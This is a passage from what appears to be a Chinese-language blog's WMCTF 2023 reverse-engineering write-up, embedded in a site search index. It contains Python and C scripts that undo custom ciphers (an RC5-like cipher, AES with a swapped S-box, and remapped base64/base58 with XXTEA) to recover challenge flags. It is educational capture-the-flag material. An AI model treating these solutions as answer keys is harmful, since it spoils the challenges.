3651791800, 32069749, 1469868411, 919887482, 4017993154, 4002737591, 3104343244, 4134211933, 420914335, 4152510760, 1317719524, 1990496755, 1873950060, 2553314372, 3602559392]def enc(a0, a1): tmp0 = a0+ek[0] tmp1 = a1+ek[1] for i in range(1, 22): # print(tmp0, tmp1) t0 = tmp0 ^ tmp1 t1 = tmp1 &amp; 31 t0 = ((t0 &lt;&lt; t1)) &amp; 0xffffffff | ((t0 &gt;&gt; (32-t1)) &amp; 0xffffffff) t0 += ek[2*i] tmp0 = t0 &amp; 0xffffffff t1 = tmp1 ^ tmp0 t0 &amp;= 31 t1 = ((t1 &lt;&lt; t0)) &amp; 0xffffffff | ((t1 &gt;&gt; (32-t0)) &amp; 0xffffffff) t1 += ek[2*i+1] tmp1 = t1 &amp; 0xffffffff return tmp0, tmp1def dec(a0, a1): tmp0 = a0 tmp1 = a1 for i in range(21, 0, -1): t1 = (tmp1-ek[2*i+1]) &amp; 0xffffffff t0 = tmp0 &amp; 31 t1 = ((t1 &gt;&gt; t0)) &amp; 0xffffffff | ((t1 &lt;&lt; (32-t0)) &amp; 0xffffffff) tmp1 = t1 ^ tmp0 t0 = (tmp0-ek[2*i]) &amp; 0xffffffff t1 = tmp1 &amp; 31 t0 = ((t0 &gt;&gt; t1)) &amp; 0xffffffff | ((t0 &lt;&lt; (32-t1)) &amp; 0xffffffff) tmp0 = t0 ^ tmp1 tmp0 =(tmp0- ek[0])&amp;0xffffffff tmp1 =(tmp1- ek[1])&amp;0xffffffff return tmp0, tmp1# a0, a1 = enc(0x61626364, 0x61626364)# print(hex(a0),hex(a1))r=[]for i in range(0,len(res),4): tmp=res[i:i+4] r.append(int.from_bytes(tmp,byteorder=\"big\"))f=[0 for _ in range(len(r))]for i in range(0,len(r),2): f[i], f[i+1] = dec(r[i], r[i+1]) if i!=0: f[i]^=r[i-2] f[i+1]^=r[i-1]for i in f: # print(hex(i)) print(int.to_bytes(i,4,byteorder=\"big\").decode(),end=\"\") ezandroid检查用户名密码，用户名直接异或，密码是换了sbox的AES 1234567891011121314151617username = [0xE9, 0x97, 0x64, 0xE6, 0x7E, 0xEB, 0xBD, 0xC1, 0xAB, 0x43]for i in range(len(username)): username[i] ^= iprint(bytes(username).hex())# rc4# Re_1s_eaSysbox = [0x29, 0x40, 0x57, 0x6E, 0x85, 0x9C, 0xB3, 0xCA, 0xE1, 0xF8, 0x0F, 0x26, 0x3D, 0x54, 0x6B, 0x82, 0x99, 0xB0, 0xC7, 0xDE, 0xF5, 0x0C, 0x23, 0x3A, 0x51, 0x68, 0x7F, 0x96, 0xAD, 0xC4, 0xDB, 0xF2, 0x09, 0x20, 0x37, 0x4E, 0x65, 0x7C, 0x93, 0xAA, 0xC1, 0xD8, 0xEF, 0x06, 0x1D, 0x34, 0x4B, 0x62, 0x79, 0x90, 0xA7, 0xBE, 0xD5, 0xEC, 0x03, 0x1A, 0x31, 0x48, 0x5F, 0x76, 0x8D, 0xA4, 0xBB, 0xD2, 0xE9, 0x00, 0x17, 0x2E, 0x45, 0x5C, 0x73, 0x8A, 0xA1, 0xB8, 0xCF, 0xE6, 0xFD, 0x14, 0x2B, 0x42, 0x59, 0x70, 0x87, 0x9E, 0xB5, 0xCC, 0xE3, 0xFA, 0x11, 0x28, 0x3F, 0x56, 0x6D, 0x84, 0x9B, 0xB2, 0xC9, 0xE0, 0xF7, 0x0E, 0x25, 0x3C, 0x53, 0x6A, 0x81, 0x98, 0xAF, 0xC6, 0xDD, 0xF4, 0x0B, 0x22, 0x39, 0x50, 0x67, 0x7E, 0x95, 0xAC, 0xC3, 0xDA, 0xF1, 0x08, 0x1F, 0x36, 0x4D, 0x64, 0x7B, 0x92, 0xA9, 0xC0, 0xD7, 0xEE, 0x05, 0x1C, 0x33, 0x4A, 0x61, 0x78, 0x8F, 0xA6, 0xBD, 0xD4, 0xEB, 0x02, 0x19, 0x30, 0x47, 0x5E, 0x75, 0x8C, 0xA3, 0xBA, 0xD1, 0xE8, 0xFF, 0x16, 0x2D, 0x44, 0x5B, 0x72, 0x89, 0xA0, 0xB7, 0xCE, 0xE5, 0xFC, 0x13, 0x2A, 0x41, 0x58, 0x6F, 0x86, 0x9D, 0xB4, 0xCB, 0xE2, 0xF9, 0x10, 0x27, 0x3E, 0x55, 0x6C, 0x83, 0x9A, 0xB1, 0xC8, 0xDF, 0xF6, 0x0D, 0x24, 0x3B, 0x52, 0x69, 0x80, 0x97, 0xAE, 0xC5, 0xDC, 0xF3, 0x0A, 0x21, 0x38, 0x4F, 0x66, 0x7D, 0x94, 0xAB, 0xC2, 0xD9, 0xF0, 0x07, 0x1E, 0x35, 0x4C, 0x63, 0x7A, 0x91, 0xA8, 0xBF, 0xD6, 0xED, 0x04, 0x1B, 0x32, 0x49, 0x60, 0x77, 0x8E, 0xA5, 0xBC, 0xD3, 0xEA, 0x01, 0x18, 0x2F, 0x46, 0x5D, 0x74, 0x8B, 0xA2, 0xB9, 0xD0, 0xE7, 0xFE, 0x15, 0x2C, 0x43, 0x5A, 0x71, 0x88, 0x9F, 0xB6, 0xCD, 0xE4, 0xFB, 0x12]print(len(sbox)) # 正向S-boxinv_sbox = [0] * 256for index, value in enumerate(sbox): inv_sbox[value] = indexprint(inv_sbox) 把生成的表替换进去 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include \"aes.h\"int main() { uint8_t i; uint8_t key[] = \"Re_1s_eaSy123456\"; uint8_t *w; // expanded key w = aes_init(sizeof(key)); aes_key_expansion(key, w); unsigned char out[16] = {0x2B, 0xC8, 0x20, 0x8B, 0x5C, 0x0D, 0xA7, 0x9B, 0x2A, 0x51, 0x3A, 0xD2, 0x71, 0x71, 0xCA, 0x50}; aes_inv_cipher(out, in, w); printf(\"%s\\n\", in); free(w); return 0;} gohunt换表base58，异或和xxtea 12345678910111213141516171819202122232425262728293031323334353637383940base64_table = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x2E, 0xFF, 0xFF, 0xFF, 0xFF, 0x0E, 0x17, 0x1B, 0x30, 0x29, 0x0F, 0x24, 0x13, 0x3D, 0x2D, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x21, 0x2A, 0x18, 0x35, 0x32, 0x1A, 0x3A, 0x3F, 0x04, 0x25, 0x38, 0x36, 0x1E, 0x20, 0x00, 0x34, 0x2C, 0x02, 0x0B, 0x1C, 0x0A, 0x26, 0x33, 0x3B, 0x06, 0x39, 0x09, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x2B, 0x28, 0x31, 0x14, 0x0C, 0x1D, 0x11, 0x37, 0x08, 0x27, 0x01, 0x15, 0x07, 0x10, 0x0D, 0x19, 0x22, 0x23, 0x3C, 0x3E, 0x12, 0x16, 0x1F, 0x03, 0x05, 0x2F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]base64_reverse_table = [0] * 256for index, value in enumerate(base64_table): if value is not None: base64_reverse_table[value] = indextable=\"\".join([chr(base64_reverse_table[i]) for i in range(64)])# table=\"NkQxHyXmiZTReo05ngu7dlv1BpE2SfLwM@qr6IUjb4AaP9+z3cDVOCKhJYFWs8tG\"import base64str1 = \"pUc@pDYASXS=2hZ4pKI+Bv3+EjkIp3==\"string1 = \"NkQxHyXmiZTReo05ngu7dlv1BpE2SfLwM@qr6IUjb4AaP9+z3cDVOCKhJYFWs8tG\"string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))import base58str2 = \"YMQHsYFQu7kkTqu3Xmt1ruYUDLU8uaMoPpsfjqYF4TQMMKtw5KF7cpWrkWpk3\"table1=\"nY7TwcE41bzWvMQZXa8fyeprJoBdmhsu9DqVgxRPtFLKN65UH2CikG3SAj\"table2=\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\"res=base58.b58decode(str2.translate(str.maketrans(table1,table2)))iv=b\"NPWrpd1CEJH2QcJ3\"f=[iv[i%len(iv)]^res[i] for i in range(len(res))]print(bytes(f))import xxteakey = b\"FMT2ZCEHS6pcfD2R\"decrypt_data = xxtea.decrypt(bytes(f), key,padding=False)print(decrypt_data)","link":"/2023/08/22/wmctf-2023/"}],"tags":[{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"36DCTF","slug":"36DCTF","link":"/tags/36DCTF/"},{"name":"HouseplantCTF","slug":"HouseplantCTF","link":"/tags/HouseplantCTF/"},{"name":"NPUCTF","slug":"NPUCTF","link":"/tags/NPUCTF/"},{"name":"SharkCTF","slug":"SharkCTF","link":"/tags/SharkCTF/"},{"name":"网鼎杯","slug":"网鼎杯","link":"/tags/%E7%BD%91%E9%BC%8E%E6%9D%AF/"},{"name":"BJDCTF","slug":"BJDCTF","link":"/tags/BJDCTF/"},{"name":"re","slug":"re","link":"/tags/re/"},{"name":"BUUCTF","slug":"BUUCTF","link":"/tags/BUUCTF/"},{"name":"ByteCTF","slug":"ByteCTF","link":"/tags/ByteCTF/"},{"name":"CG-CTF","slug":"CG-CTF","link":"/tags/CG-CTF/"},{"name":"buuctf","slug":"buuctf","link":"/tags/buuctf/"},{"name":"Javis OJ","slug":"Javis-OJ","link":"/tags/Javis-OJ/"},{"name":"IDA","slug":"IDA","link":"/tags/IDA/"},{"name":"查表","slug":"查表","link":"/tags/%E6%9F%A5%E8%A1%A8/"},{"name":"MRCTF","slug":"MRCTF","link":"/tags/MRCTF/"},{"name":"WPICTF","slug":"WPICTF","link":"/tags/WPICTF/"},{"name":"b01lersCTF","slug":"b01lersCTF","link":"/tags/b01lersCTF/"},{"name":"攻防世界","slug":"攻防世界","link":"/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"unicorn","slug":"unicorn","link":"/tags/unicorn/"},{"name":"z3","slug":"z3","link":"/tags/z3/"},{"name":"bugku","slug":"bugku","link":"/tags/bugku/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"opcode","slug":"opcode","link":"/tags/opcode/"},{"name":"hgame","slug":"hgame","link":"/tags/hgame/"},{"name":"linux驱动","slug":"linux驱动","link":"/tags/linux%E9%A9%B1%E5%8A%A8/"},{"name":"kernel","slug":"kernel","link":"/tags/kernel/"},{"name":"mfc","slug":"mfc","link":"/tags/mfc/"},{"name":"5space","slug":"5space","link":"/tags/5space/"},{"name":"crypto","slug":"crypto","link":"/tags/crypto/"},{"name":"脱壳","slug":"脱壳","link":"/tags/%E8%84%B1%E5%A3%B3/"},{"name":"花指令","slug":"花指令","link":"/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"高校战“疫”","slug":"高校战“疫”","link":"/tags/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D/"},{"name":"vnctf","slug":"vnctf","link":"/tags/vnctf/"},{"name":"wmctf","slug":"wmctf","link":"/tags/wmctf/"}],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"学习笔记","slug":"学习笔记","link":"/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"python","slug":"python","link":"/categories/python/"}]}